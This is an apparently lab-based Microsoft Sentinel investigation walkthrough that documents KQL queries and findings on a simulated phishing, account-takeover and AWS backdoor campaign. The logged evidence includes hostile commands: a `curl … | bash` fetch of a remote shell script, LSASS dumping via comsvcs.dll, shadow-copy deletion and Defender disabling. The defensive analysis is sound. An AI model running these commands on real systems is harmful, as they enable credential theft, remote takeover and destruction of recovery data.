# Walkthrough

Chronological record of the queries run during the investigation and their
results.

## Session 1 – Data sources

Microsoft Sentinel workspace `sentinel-lab-main-ws` → Logs.
Ingested volume per table compared with the rows currently available.

```kql
let ingested = Usage
    | where TimeGenerated > datetime(1970-01-01)
    | summarize IngestedMB = round(sum(Quantity), 2), LastIngested = max(TimeGenerated) by DataType;
let present = search *
    | where TimeGenerated > datetime(1970-01-01)
    | extend DataType = $table
    | summarize RowsNow = count() by DataType;
ingested
| join kind=leftouter present on DataType
| project DataType, IngestedMB, LastIngested, RowsNow = coalesce(RowsNow, 0)
| sort by IngestedMB desc
```

| DataType | IngestedMB | LastIngested (UTC) | RowsNow |
|---|---|---|---|
| AADNonInteractiveUserSignInLogs | 1684.47 | 2026-11-04 10:00 | 140658 |
| SigninLogs | 62.33 | 2026-11-04 10:00 | 4796 |
| AuditLogs | 30.54 | 2026-11-04 10:00 | 7437 |
| SecurityEvent | 16.34 | 2026-10-28 08:00 | 23864 |
| AzureActivity | 10.52 | 2026-11-03 21:00 | 1205 |
| SecurityIncident | 3.47 | 2026-11-04 10:00 | 654 |
| SecurityAlert | 2.81 | 2026-11-04 10:00 | 505 |
| SecurityCaseEvent | 1.48 | 2026-11-04 10:00 | 4716 |
| AzureActivity_CL | 0.48 | 2026-10-28 08:00 | 325 |
| CrowdStrikeDetections | 0.35 | 2026-10-28 08:00 | 54 |
| OfficeActivity_CL | 0.24 | 2026-10-28 08:00 | 266 |
| sign_in_adelete_CL | 0.22 | 2026-10-28 08:00 | 56 |
| azureActivity_adele_CL | 0.16 | 2026-10-28 08:00 | 23 |
| CommonSecurityLog | 0.13 | 2026-10-28 08:00 | 149 |
| Watchlist | 0.07 | 2026-10-30 04:00 | 0 |
| CrowdStrikeAlerts | 0.06 | 2026-10-28 08:00 | 53 |
| OktaV2_CL | 0.05 | 2026-10-28 08:00 | 36 |
| AWSCloudTrail | 0.04 | 2026-10-28 08:00 | 47 |
| GCPAuditLogs | 0.04 | 2026-10-28 08:00 | 25 |
| MailGuard365_Threats_CL | 0.02 | 2026-10-28 08:00 | 41 |
| CrowdStrikeVulnerabilities | 0.02 | 2026-10-28 08:00 | 10 |
| CrowdStrikeHosts | 0.01 | 2026-10-28 08:00 | 8 |
| Operation | 0.01 | 2026-11-04 07:00 | 29 |
| AuditLogsHunting_CL | 0.01 | 2026-10-28 08:00 | 5 |
| disable_accounts_CL | 0.01 | 2026-10-28 08:00 | 4 |
| SEG_MailGuard_CL | 0.01 | 2026-10-28 08:00 | 5 |
| office_activity_inbox_rule_CL | 0.00 | 2026-10-28 08:00 | 2 |
| model_evasion_detection_CL | 0.00 | 2026-10-28 08:00 | 4 |

The lab data set (endpoint, network, email, identity and cloud tables) was
ingested on 2026-10-28. SigninLogs, AuditLogs and AADNonInteractiveUserSignInLogs
are live tenant logs.

## Session 1 – Incident overview

```kql
SecurityIncident
| where TimeGenerated > datetime(1970-01-01)
| summarize arg_max(TimeGenerated, *) by IncidentNumber
| project IncidentNumber, CreatedTime, Title, Severity, Status, AlertCount = array_length(AlertIds)
| sort by CreatedTime asc
```

152 incidents (2026-09-25 – 2026-11-04). Most of them (Low,
"Multiple failed sign-in attempts by a user ...") are recurring live tenant
noise. Incidents other than that:

| # | Created (UTC) | Title | Severity | Alerts |
|---|---|---|---|---|
| 248 | 2026-10-14 07:25 | Authentication from password-spraying infrastructure involving one user | High | 1 |
| 275 | 2026-10-18 12:44 | Multi-stage incident involving Execution & Persistence on one endpoint | Medium | 3 |
| 324 | 2026-10-28 07:19 | NRT Security Event log cleared | Medium | 1 |
| 325 | 2026-10-28 07:21 | AWS CloudTrail logging stopped on established trail | Medium | 1 |
| 326 | 2026-10-28 07:34 | Multi-stage incident involving Privilege escalation on one endpoint | High | 10 |
| 328–333 | 2026-10-28 08:09 | Lab Stage 2 - Malicious payload execution detected (CrowdStrike) | High | 1 each |
| 334 | 2026-10-28 15:40 | Multi-stage incident involving one user | Medium | 4 |
| 335, 336 | 2026-10-28 15:40 | Suspicious AWS CLI Command Execution involving one user | Medium | 0 (Closed) |
| 348 | 2026-11-03 04:06 | Credential access incident involving one user | Low | 1 |

Incidents 324–336 were created right after the lab data was ingested
(2026-10-28 07:13–07:16 UTC).

## Session 1 – Alerts behind the lab incidents

```kql
let inc = SecurityIncident
    | where TimeGenerated > datetime(1970-01-01)
    | where IncidentNumber between (324 .. 336)
    | summarize arg_max(TimeGenerated, *) by IncidentNumber
    | mv-expand AlertId = AlertIds to typeof(string)
    | project IncidentNumber, AlertId;
SecurityAlert
| where TimeGenerated > datetime(1970-01-01)
| summarize arg_max(TimeGenerated, *) by SystemAlertId
| join kind=inner inc on $left.SystemAlertId == $right.AlertId
| project IncidentNumber, StartTime, AlertName, ProductName, AlertSeverity, CompromisedEntity, Tactics, Techniques
| sort by StartTime asc
```

| Inc. | StartTime (UTC) | Alert | Severity | Tactic | Techniques |
|---|---|---|---|---|---|
| 334 | 2026-10-27 15:34 | AWS Config Service Resource Deletion Attempts (×2) | Low | DefenseEvasion | T1562 |
| 324 | 2026-10-27 19:19 | NRT Security Event log cleared | Medium | DefenseEvasion | T1070 |
| 326 | 2026-10-28 07:09 | Lab Stage 10 - Phishing campaign bypassed MailGuard365 (MailGuard) (×3) | High | InitialAccess | T1566 |
| 326 | 2026-10-28 07:11 | Lab Stage 4 - Account takeover by mirage@pkwork.onmicrosoft.com from RU (Okta) | High | PrivilegeEscalation | T1098, T1078 |
| 326 | 2026-10-28 07:12 | Lab Stage S1 - Phishing email delivered to mirage@pkwork.onmicrosoft.com (MailGuard) | Medium | InitialAccess | T1566 |
| 334 | 2026-10-28 07:13 | Suspicious AWS CLI Command Execution (×2) | Medium | Reconnaissance | T1595, T1592, T1589, T1590, T1591, T1596 |
| 325 | 2026-10-28 07:13 | AWS CloudTrail logging stopped on established trail | Medium | DefenseEvasion | T1562 |
| 326 | 2026-10-28 07:13 | Lab Stage 6 - Large data exfiltration to external IP (Palo Alto) | High | Exfiltration | T1041 |
| 326 | 2026-10-28 07:13 | Lab Stage 3.5 - Internal port scan detected (Palo Alto) | Medium | Discovery | T1046 |
| 326 | 2026-10-28 07:13 | Lab Stage 5 - C2 beaconing detected from win11a (Palo Alto) | High | CommandAndControl | T1071 |
| 328–333 | 2026-10-28 07:14 | Lab Stage 2 - Malicious payload execution detected (CrowdStrike) | High | Execution | T1204 |
| 326 | 2026-10-28 07:14 | Lab Stage 2.5 - Persistence mechanism detected on win11a (CrowdStrike) | High | Persistence | T1547 |
| 326 | 2026-10-28 07:14 | Lab Stage 5.5 - C2 activity detected on win11a (CrowdStrike) | High | CommandAndControl | T1071 |

Alert start times on 2026-10-28 match the ingestion time of the source
tables, not the original event times.

## Session 1 – Entities in the lab alerts

```kql
SecurityAlert
| where TimeGenerated > datetime(1970-01-01)
| where AlertName has "Lab Stage" or AlertName has_any ("CloudTrail", "AWS", "Event log cleared")
| summarize arg_max(TimeGenerated, *) by SystemAlertId
| mv-expand E = todynamic(Entities)
| extend EntityType = tostring(E.Type),
         Value = coalesce(tostring(E.HostName), tostring(E.Address), tostring(E.Name),
                          tostring(E.Url), tostring(E.Value), tostring(E.AadUserId))
| where isnotempty(Value)
| summarize Alerts = make_set(AlertName) by EntityType, Value
| sort by EntityType asc
```

| Type | Value | Alerts |
|---|---|---|
| account | mirage | All lab stages (S1, 2, 2.5, 3.5, 4, 5, 5.5, 6, 10), NRT Security Event log cleared, AWS Config Service Resource Deletion Attempts, Suspicious AWS CLI Command Execution |
| account | aturner, psharma, spatel, jliu, ceo | Lab Stage 2 - Malicious payload execution detected (CrowdStrike) |
| host | win11a | Lab stages 2, 2.5, 3.5, 5, 5.5, 6, NRT Security Event log cleared |
| host | win11b, win11c, win11d, it-ws01, dev-ws01 | Lab Stage 2 - Malicious payload execution detected (CrowdStrike) |
| ip | 198.51.100.42 | AWS CloudTrail logging stopped on established trail, AWS Config Service Resource Deletion Attempts |

## Session 1 – CrowdStrike detections

```kql
CrowdStrikeDetections
| where TimeGenerated > datetime(1970-01-01)
```

54 detections. The original event time is in `Behaviors.timestamp`
(ISO 8601): 2026-02-06 14:46 – 18:42 UTC. `FirstBehavior` is displayed as
6/2/2026 because the source value `06/02/2026` was parsed as month/day.
Parsed view: `queries/04-crowdstrike-detections.kql`.

Key detections (first occurrence per host and behavior):

| Time (UTC) | Host | User | Behavior | Command line |
|---|---|---|---|---|
| 14:46:27 | win11a (10.0.1.50) | mirage | User Execution: Malicious File (T1204.002) | `C:\Users\mirage\Downloads\report.exe` |
| 14:51:42 | win11a | mirage | Credential Dumping via LSASS (T1003.001) | `rundll32.exe comsvcs.dll MiniDump` |
| 15:18:42 | win11a | mirage | NetworkConnect C2 (T1071.001) | `report.exe --connect update-service-cdn.xyz` |
| 17:44:24 | srv-file01 (10.0.0.20) | jliu | Credential Dumping via LSASS | `rundll32.exe comsvcs.dll MiniDump` |
| 17:45:36 | it-ws01 (10.0.1.53) | jliu | Malicious PowerShell Execution | `C:\Users\jliu\Downloads\report.exe` |
| 17:46:48 | it-ws01 | jliu | Sensitive File Staging (T1005) | `xcopy "C:\Users\*\Documents\*.docx" C:\Temp\staging` |
| 17:49:12 | win11a | mirage | C2 Beacon Detected (T1071) | `svchost.exe -k netsvcs` |
| 17:51:36 | srv-file01 | jliu | Ransomware Behavior (T1486) | `vssadmin.exe delete shadows /all /quiet` |
| 17:52:48 | win11c (10.0.1.52) | spatel | Malicious PowerShell Execution | `C:\Users\spatel\Downloads\report.exe` |
| 17:54:00 | win11a | mirage | Security Tool Tamper Attempt (T1562) | `Set-MpPreference -DisableRealtimeMonitoring $true` |
| 17:55:12 | dev-ws01 (10.0.2.10) | aturner | Malicious PowerShell Execution | `C:\Users\aturner\Downloads\report.exe` |
| 17:56:24 | srv-dc01 (10.0.0.10) | jliu | Ransomware Behavior (T1486) | `vssadmin.exe delete shadows /all /quiet` |
| 17:57:36 | win11a | mirage | Malicious PowerShell Execution | `powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==` |
| 18:02:24 | win11b (10.0.1.51) | ceo | Sensitive File Staging | `xcopy "C:\Users\*\Documents\*.docx" C:\Temp\staging` |
| 18:07:12 | win11d (10.0.1.54) | psharma | Lateral Movement via SMB (T1021) | `net use \\target\C$ /user:admin` |
| 18:20:24 | win11a | mirage | Ransomware Behavior (T1486) | `vssadmin.exe delete shadows /all /quiet` |
| 18:22:48 | win11b | ceo | Malicious PowerShell Execution | `C:\Users\ceo\Downloads\report.exe` |

Notes:

- The encoded PowerShell decodes (UTF-16LE Base64) to `Invoke-WebRequest`.
- `report.exe` has SHA256 `e3b0c442...7852b855`, the hash of an empty file.
  It is a placeholder in the lab data and cannot be used as an IOC.
- `Status` values (true_positive / false_positive) are inconsistent for
  identical behaviors and are not used as evidence.

## Session 1 – Palo Alto firewall flows

```kql
CommonSecurityLog
| where TimeGenerated > datetime(1970-01-01)
| where not(DestinationIP startswith "10.") or DestinationIP == "10.0.1.200"
| summarize Events = count(), SentBytes = sum(SentBytes), ReceivedBytes = sum(ReceivedBytes),
            Ports = make_set(DestinationPort, 50), Start = min(ReceiptTime), End = max(ReceiptTime)
    by SourceIP, DestinationIP, DeviceAction, Activity
| sort by SentBytes desc
```

| SourceIP | DestinationIP | Action | Activity | Events | SentBytes | ReceivedBytes | Ports |
|---|---|---|---|---|---|---|---|
| 10.0.1.50 | 192.0.2.100 | allow | end | 17 | 183,003,413 | 14,660 | 443, 53 |
| 10.0.1.50 | 10.0.1.200 | deny | drop | 25 | 2,135 | 8,018 | 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443 |
| 10.0.1.50 | 192.0.2.100 | alert | spyware | 1 | 2,016 | 38,569 | 443 |
| 10.0.1.50 | 198.51.100.42 | allow | end | 2 | 1,374 | 785 | 443 |
| 10.0.1.50 | 203.0.113.77 | allow | end | 2 | 956 | 532 | 443 |

`ReceiptTime` is empty, so the firewall log gives no original event time.

## Session 1 – Okta

```kql
OktaV2_CL
| where TimeGenerated > datetime(1970-01-01)
| project EventStartTime = column_ifexists("EventStartTime", datetime(null)),
          ActorUsername, EventOriginalType, EventMessage,
          TargetUsername = column_ifexists("TargetUsername", ""),
          SrcIpAddr = column_ifexists("SrcIpAddr", ""),
          SrcGeoCountry = column_ifexists("SrcGeoCountry", ""),
          SrcGeoCity = column_ifexists("SrcGeoCity", ""),
          HttpUserAgent = column_ifexists("HttpUserAgent", "")
| sort by EventStartTime asc
```

36 events. Events of mirage (all from 198.51.100.42, RU, Moscow):

| Event type | Message | User agent |
|---|---|---|
| user.session.start | User login to Okta | Mozilla/5.0 (macOS 14.2) Safari/17.2 |
| user.account.privilege.grant | Grant user super admin role | Mozilla/5.0 (macOS 14.2) Edge/120.0 |
| system.api_token.create | Create API token | Mozilla/5.0 (Ubuntu 22.04) Chrome/120.0 |
| user.mfa.factor.deactivate | Deactivate SMS factor for user Priya Sharma | Mozilla/5.0 (Ubuntu 22.04) Chrome/120.0 |
| user.mfa.factor.reset_all | Reset all MFA factors for user CEO PKWork | Mozilla/5.0 (Ubuntu 22.04) Chrome/120.0 |
| user.mfa.factor.update | Enroll new TOTP factor for attacker-controlled device | Mozilla/5.0 (Ubuntu 22.04) Chrome/120.0 |

The other 30 events (psharma, ceo, aturner, spatel, jliu: logins, MFA,
OAuth2 token grants, sign-on policy evaluations) come from US IP addresses
that differ for every event. `EventStartTime` is empty, so the original event
time is not available.

## Session 1 – MailGuard email logs

The CSV export keeps at most 20 columns, so every row is packed into one
JSON column:

```kql
union isfuzzy=true withsource=SrcTbl_ SEG_MailGuard_CL, MailGuard365_Threats_CL
| where TimeGenerated > datetime(1970-01-01)
| project SrcTbl_, Row = pack_all(true)
```

46 messages. Messages to `pkwork.onmicrosoft.com` that are malicious or
involve mirage (no original timestamp is available):

| Sender (IP) | Recipient | Subject | Attachment / URL | Verdict | Action |
|---|---|---|---|---|---|
| finance-dept@malicious-infra.xyz (198.51.100.42) | mirage | Urgent: Review Updated Invoice #9842 | report.exe; `https://update-service-cdn.xyz/payload` | Phish (85) | **Allow** |
| hr-notifications@pkwork-hr.com (198.51.100.42) | mirage | HR: Updated Benefits Enrollment Form | report.exe; `https://update-service-cdn.xyz/download/report.exe` | Phishing (92) | **Allow** |
| security@pkwork-hr.com (198.51.100.42) | mirage | Security Alert: Unusual Sign-In Activity | `https://update-service-cdn.xyz/security/verify?id=xyz789` | Suspicious (78) | **Allow** |
| it-support@pkwork-hr.com (198.51.100.42) | psharma | IT: Urgent Password Reset Required | report.exe | Malicious (97) | Hold |
| noreply@malicious-infra.xyz (198.51.100.42) | admin | RE: Meeting Notes - Please Review Attachment | meeting-notes.docm | Phish (92) | Quarantine |
| security-team@m1crosoft-support.xyz (91.219.236.100) | mirage | Urgent: Your Microsoft 365 password expires today | `https://m1crosoft-support.xyz/password-reset` | Phishing (92) | **Allow** |
| security-alert@m1crosoft-support.xyz (91.219.236.100) | spatel | Security alert: Unusual sign-in activity on your account | `https://m1crosoft-support.xyz/account-verify` | Phishing (95) | **Allow** |
| urgent-security@m1crosoft-support.xyz (91.219.236.100) | ceo | Your account has been compromised - reset password now | `https://m1crosoft-support.xyz/account-reset` | Phishing (96) | **Allow** |
| no-reply@0ffice365-security.xyz (91.219.236.100) | jliu | Action Required: Verify your identity immediately | identity-verification.html; `https://0ffice365-security.xyz/verify`, `/login` | Phishing (88) | **Allow** |
| verify-account@0ffice365-security.xyz (91.219.236.100) | aturner | Unusual activity detected on your Office 365 account | `https://0ffice365-security.xyz/suspicious-activity` | Phishing (91) | **Allow** |
| hr-benefits@pkwork-hr-portal.xyz (185.220.101.55) | mirage | HR: Updated benefits enrollment - action needed | Benefits-Enrollment-2026.xlsx; `https://pkwork-hr-portal.xyz/benefits` | Phishing (90) | **Allow** |
| hr-payroll@pkwork-hr-portal.xyz (185.220.101.55) | psharma | HR: Your October pay stub is ready for review | October-PayStub-2026.pdf | Phishing (94) | **Allow** |
| sharepoint-notify@sh4repoint-pkwork.xyz (185.220.101.55) | ceo | SharePoint: Board meeting documents shared with you | Q4-Board-Meeting-Agenda.docx; `https://sh4repoint-pkwork.xyz/download/board-agenda` | Phishing (93) | **Allow** |
| sharepoint-notify@sh4repoint-pkwork.xyz (185.220.101.55) | jliu | SharePoint: IT infrastructure audit report has been shared | IT-Audit-Report-Q4.xlsx; `https://sh4repoint-pkwork.xyz/download/audit-report` | Phishing (89) | **Allow** |
| mirage@pkwork.onmicrosoft.com (10.0.1.50) | ceo | Weekly Status Update | 2 URLs (not logged) | Clean | Allow |

All external phishing messages fail SPF and DMARC and spoof the `From` header
(microsoft.com or pkwork.onmicrosoft.com). Most were allowed although
MailGuard classified them as phishing.

## Session 1 – AWS CloudTrail

```kql
AWSCloudTrail
| where TimeGenerated > datetime(1970-01-01)
| project Row = pack_all(true)
```

47 events in account `123456789012` (us-east-1). Original event time is not
available; `SessionCreationDate` of the mirage session is 2026-10-02 11:00:12 UTC.

Activity of mirage (IAM user, source IP 198.51.100.42):

| Service | Event | Details |
|---|---|---|
| signin | ConsoleLogin | Success, `MFAUsed: No` |
| sts | GetCallerIdentity | — |
| iam, ec2, kms | ListUsers, ListGroups, ListRoles, GetUser, ListAccessKeys, DescribeVpcs, DescribeSubnets, DescribeSecurityGroups, DescribeNetworkInterfaces, ListKeys | Discovery via `aws-cli/2.15.0` |
| iam | CreateUser | `backdoor-svc` |
| iam | CreateAccessKey | `backdoor-svc`, key `AKIAI99ATTACKKEY` |
| iam | AttachUserPolicy | `backdoor-svc` ← `AdministratorAccess` |
| iam | CreateLoginProfile | `backdoor-svc`, `passwordResetRequired: false` |
| ec2 | AuthorizeSecurityGroupIngress | `sg-0a1b2c3d4e5f67890`, all protocols from `0.0.0.0/0` |
| ec2 | RunInstances | 5 × `p3.16xlarge` (GPU) |
| ec2 | ModifyInstanceAttribute | `i-0a1b2c3d4e5f00001` user data: `curl https://185.220.101.55/shell.sh \| bash` |
| ec2 | DisassociateIamInstanceProfile | `iip-assoc-0a1b2c3d4e5f67890` |
| s3 | GetObject | `corp-data-prod`: `finance/2026-budget-final.xlsx`, `hr/employee-records-full.csv`, `secrets/api-keys-production.json` |
| cloudtrail | StopLogging, DeleteTrail | `management-events-trail` |

Other relevant events:

| User | Source IP | Event | Result |
|---|---|---|---|
| backdoor-svc | 198.51.100.42 | ConsoleLogin (session 11:30:15) | Success |
| backdoor-svc | 203.0.113.77 | ConsoleLogin (session 11:35:00), DescribeInstances | Success |
| eve.hacker | 91.219.236.100 | ConsoleLogin (×2) | Failure |

jane.smith (198.51.100.22), bob.jones (203.0.113.50) and deploy-svc
(10.0.5.100) show routine read-only and deployment activity.
